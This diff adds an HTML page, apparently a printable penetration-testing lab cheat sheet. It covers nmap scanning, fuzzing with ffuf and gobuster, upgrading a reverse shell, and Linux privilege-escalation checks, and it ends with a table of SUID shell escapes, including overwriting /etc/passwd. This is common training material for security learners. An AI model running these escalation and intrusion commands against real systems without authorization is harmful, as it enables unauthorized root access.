@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cybersecurity & Ethical Hacking Practical Starter Handbook</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap');
+    
+    :root {
+      --bg: #090d16;
+      --card-bg: #111827;
+      --accent: #10b981;
+      --accent-blue: #38bdf8;
+      --text: #f1f5f9;
+      --text-muted: #94a3b8;
+      --border: #1e293b;
+    }
+    
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      background: #020617;
+      color: var(--text);
+      line-height: 1.6;
+      padding: 40px 20px;
+    }
+    
+    .sheet {
+      max-width: 880px;
+      margin: 0 auto 40px auto;
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 45px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+      page-break-after: always;
+    }
+
+    @media print {
+      body { background: #fff; color: #000; padding: 0; }
+      .sheet { border: none; box-shadow: none; background: #fff; color: #000; padding: 20px; }
+      .no-print { display: none !important; }
+      pre { background: #f1f5f9 !important; color: #0f172a !important; border: 1px solid #cbd5e1; }
+      code { color: #0f172a !important; }
+      h1, h2, h3 { color: #0f172a !important; }
+    }
+
+    header {
+      border-bottom: 2px solid var(--border);
+      padding-bottom: 20px;
+      margin-bottom: 30px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .title-group h1 {
+      font-size: 26px;
+      font-weight: 800;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .badge {
+      background: rgba(16, 185, 129, 0.15);
+      border: 1px solid rgba(16, 185, 129, 0.4);
+      color: var(--accent);
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: 700;
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    h2 {
+      font-size: 19px;
+      color: var(--accent-blue);
+      margin: 28px 0 14px 0;
+      border-left: 4px solid var(--accent);
+      padding-left: 12px;
+    }
+
+    p { margin-bottom: 14px; font-size: 15px; color: var(--text-muted); }
+
+    pre {
+      background: #030712;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 16px;
+      overflow-x: auto;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      color: #a5f3fc;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+
+    .command-desc {
+      color: #94a3b8;
+      font-size: 13px;
+      margin-top: -12px;
+      margin-bottom: 16px;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-bottom: 25px;
+      font-size: 14px;
+    }
+
+    th, td {
+      border: 1px solid var(--border);
+      padding: 10px 14px;
+      text-align: left;
+    }
+
+    th {
+      background: #030712;
+      color: #38bdf8;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+    }
+
+    .print-btn {
+      position: fixed;
+      bottom: 25px;
+      right: 25px;
+      background: var(--accent);
+      color: #030712;
+      padding: 12px 24px;
+      border-radius: 30px;
+      font-weight: 700;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 4px 15px rgba(16, 185, 129, 0.4);
+      z-index: 100;
+    }
+    .print-btn:hover { opacity: 0.9; }
+  </style>
+</head>
+<body>
+
+  <button class="print-btn no-print" onclick="window.print()">🖨️ Print / Save as PDF</button>
+
+  <!-- SHEET 1: RECONNAISSANCE & SCANNING -->
+  <div class="sheet">
+    <header>
+      <div class="title-group">
+        <h1>🛡️ Cybersecurity & Pentesting Field Handbook</h1>
+      </div>
+      <div class="badge">v2026 Practical Labs</div>
+    </header>
+
+    <h2>1. Network Reconnaissance & Port Scanning (Nmap)</h2>
+    <p>Essential Nmap flags for fast, stealthy, and comprehensive port discovery:</p>
+
+    <pre><code># Fast SYN Stealth Scan (Top 1000 Ports)
+nmap -sS -T4 -v &lt;TARGET_IP&gt;
+
+# Full Service Version Detection + Default NSE Scripts + OS
+nmap -sC -sV -O -p- -T4 -oN nmap_full.txt &lt;TARGET_IP&gt;
+
+# High-Speed All-Ports UDP Discovery
+nmap -sU --top-ports 100 -T4 &lt;TARGET_IP&gt;
+
+# Specific Vulnerability Script Scan
+nmap --script vuln -p 80,443,445,3389 &lt;TARGET_IP&gt;</code></pre>
+
+    <h2>2. Common Port & Service Attack Vectors</h2>
+    <table>
+      <thead>
+        <tr>
+          <th>Port</th>
+          <th>Protocol</th>
+          <th>Common Misconfiguration / Attack Vector</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td>21</td><td>FTP</td><td>Anonymous Login (<code>anonymous:anonymous</code>), ProFTPD RCE</td></tr>
+        <tr><td>22</td><td>SSH</td><td>Weak root credentials, exposed private keys (<code>id_rsa</code>)</td></tr>
+        <tr><td>80 / 443</td><td>HTTP(S)</td><td>SQL Injection, SSRF, XSS, Path Traversal, IDOR</td></tr>
+        <tr><td>445</td><td>SMB</td><td>Null session (<code>smbclient -L //IP/ -N</code>), EternalBlue (MS17-010)</td></tr>
+        <tr><td>3389</td><td>RDP</td><td>BlueKeep (CVE-2019-0708), Credential brute force</td></tr>
+      </tbody>
+    </table>
+
+    <h2>3. Web Application Enumeration (Ffuf & Gobuster)</h2>
+    <pre><code># Directory & File Fuzzing with Ffuf
+ffuf -u http://&lt;TARGET&gt;/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
+
+# Subdomain Bruteforcing
+gobuster vhost -u http://&lt;TARGET&gt; -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</code></pre>
+  </div>
+
+  <!-- SHEET 2: PRIVILEGE ESCALATION & SHELLS -->
+  <div class="sheet">
+    <header>
+      <div class="title-group">
+        <h1>⚡ Linux & Windows Privilege Escalation</h1>
+      </div>
+      <div class="badge">Post-Exploitation</div>
+    </header>
+
+    <h2>1. Upgrading a Reverse Shell to Full Interactive TTY</h2>
+    <pre><code># 1. In reverse shell:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# 2. Press: Ctrl + Z (background process)
+# 3. In your local terminal:
+stty raw -echo; fg
+
+# 4. In the returned shell:
+reset
+export TERM=xterm-256color
+stty rows 38 columns 116</code></pre>
+
+    <h2>2. Linux Privilege Escalation Quick Checks</h2>
+    <pre><code># Sudo permissions without password
+sudo -l
+
+# Find SUID binaries (Executes with root permission)
+find / -perm -4000 -type f 2>/dev/null
+
+# Inspect automated cronjobs
+cat /etc/crontab /etc/cron.* 2>/dev/null
+crontab -l
+
+# Check readable shadow or writable passwd
+ls -la /etc/passwd /etc/shadow</code></pre>
+
+    <h2>3. GTFOBins High-Frequency Living-off-the-Land Binaries</h2>
+    <table>
+      <thead>
+        <tr>
+          <th>Binary</th>
+          <th>SUID Privilege Escalation Execution</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td><code>find</code></td><td><code>find . -exec /bin/sh -p \; -quit</code></td></tr>
+        <tr><td><code>vim</code></td><td><code>vim -c ':!/bin/sh'</code></td></tr>
+        <tr><td><code>bash</code></td><td><code>bash -p</code></td></tr>
+        <tr><td><code>env</code></td><td><code>env /bin/sh -p</code></td></tr>
+        <tr><td><code>cp</code></td><td>Overwrite <code>/etc/passwd</code> with custom root hash</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+</body>
+</html>
